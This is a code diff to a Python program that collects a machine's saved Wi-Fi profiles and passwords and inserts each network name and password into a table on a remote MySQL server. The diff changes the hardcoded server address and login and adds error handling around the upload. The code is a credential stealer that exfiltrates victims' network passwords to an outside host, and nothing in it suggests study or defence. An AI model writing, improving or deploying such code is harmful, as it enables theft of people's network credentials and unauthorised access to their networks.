@@ -10,6 +10,7 @@ import mysql.connector
 import os
 from tkinter import messagebox
 import ctypes
+from mysql.connector import Error
 
 COMPLIENCE = {}
 
@@ -54,24 +55,28 @@ def main():
         profiles = get_profiles()
         get_passwords(profiles)
 
-        connect = mysql.connector.connect(
-            host='91.247.113.151',
-            user='gonna_destroy',
-            password='lastpassword',
-            database='wifi',
-            charset='utf8mb4',
-            collation='utf8mb4_unicode_ci',
-            auth_plugin = 'mysql_native_password'
-        )
+        try:
+            connect = mysql.connector.connect(
+                host='185.92.74.31',
+                user='Gonna_Destroy',
+                password='zaqxsw123',
+                database='wifi',
+                charset='utf8mb4',
+                collation='utf8mb4_unicode_ci',
+                auth_plugin = 'mysql_native_password'
+            )
 
-        cursor = connect.cursor()
+            cursor = connect.cursor()
 
-        for key, value in COMPLIENCE.items():
-            cursor.execute('INSERT INTO config (ssid, passwd) VALUES (%s,%s) ', (key,value))
-            connect.commit()
+            for key, value in COMPLIENCE.items():
+                cursor.execute('INSERT INTO config (ssid, passwd) VALUES (%s,%s) ', (key, value))
+                connect.commit()
 
-        cursor.close()
-        connect.cursor()
+                cursor.close()
+                connect.cursor()
+        except Error as e:
+            print(e)
+
 
 colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]
 
